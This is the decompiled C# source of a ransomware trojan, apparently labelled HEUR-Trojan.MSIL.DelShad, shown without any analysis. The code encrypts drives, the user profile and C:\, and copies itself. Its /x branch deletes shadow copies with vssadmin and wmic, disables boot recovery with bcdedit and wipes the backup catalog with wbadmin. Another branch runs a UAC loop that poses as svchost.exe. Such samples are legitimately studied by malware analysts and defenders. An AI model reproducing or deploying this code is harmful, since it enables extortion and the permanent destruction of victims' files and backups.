// Decompiled with JetBrains decompiler
// Type: TimeTime.Program
// Assembly: TimeTime, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1A56EB44-8C9A-40B6-A1B1-394140A18361
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-972e65bc88e89bd5ce6bada6ba84bf9b5fb64d1b742e2b1ebf95c4926b8f2b3e.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace TimeTime
{
  internal static class Program
  {
    private static void DoStuff()
    {
      try
      {
        File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + Settings.decryptor_file_name);
        Cryptor.EncryptDisks();
        Cryptor.TryEncryptFolder(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
        Cryptor.EncryptFolder("C:\\");
      }
      catch (Exception ex)
      {
      }
    }

    private static void runCommand(string commands)
    {
      Process process = new Process();
      process.StartInfo = new ProcessStartInfo()
      {
        FileName = "cmd.exe",
        Arguments = "/C " + commands,
        WindowStyle = ProcessWindowStyle.Hidden
      };
      process.Start();
      process.WaitForExit();
    }

    private static void RunItself(string args) => new Process()
    {
      StartInfo = new ProcessStartInfo()
      {
        FileName = Application.ExecutablePath,
        Arguments = args,
        WindowStyle = ProcessWindowStyle.Hidden,
        WorkingDirectory = Path.GetDirectoryName(Application.ExecutablePath)
      }
    }.Start();

    private static byte[] RandomBytes(int l)
    {
      Random random = new Random();
      byte[] numArray = new byte[l];
      for (int index = 0; index < l; ++index)
        numArray[index] = (byte) random.Next(0, random.Next(10, 1000));
      return numArray;
    }

    private static void Security()
    {
      if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\" + Settings.security_vaccine))
        return;
      Program.RunItself("/c");
    }

    private static void MainThing()
    {
      Program.Security();
      FileManager.Init();
      foreach (string file in FileManager.GetFiles())
      {
        try
        {
          if (!Cryptor.encr_files.Contains(file))
            Cryptor.encr_files.Add(file);
        }
        catch (Exception ex)
        {
        }
      }
      try
      {
        new Thread(new ThreadStart(Program.DoStuff)).Start();
      }
      catch (Exception ex)
      {
        Program.DoStuff();
      }
      Thread.Sleep(10000);
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      Application.Run((Form) new Form1());
    }

    [STAThread]
    private static void Main()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\" + Settings.security_vaccine;
      string[] commandLineArgs = Environment.GetCommandLineArgs();
      if (commandLineArgs.Length > 1)
      {
        if (commandLineArgs[1] == "/x")
        {
          Program.runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
          Program.runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
          Program.runCommand("wbadmin delete catalog -quiet");
          File.WriteAllBytes(path, Program.RandomBytes(512));
        }
        if (commandLineArgs[1] == "/c")
        {
          Utils.uac_loop("svchost.exe");
          Environment.Exit(0);
        }
        if (commandLineArgs[1] == "/a")
          Program.MainThing();
        Environment.Exit(0);
      }
      if (File.Exists(path))
        Program.MainThing();
      else
        Utils.CopyItself();
    }
  }
}
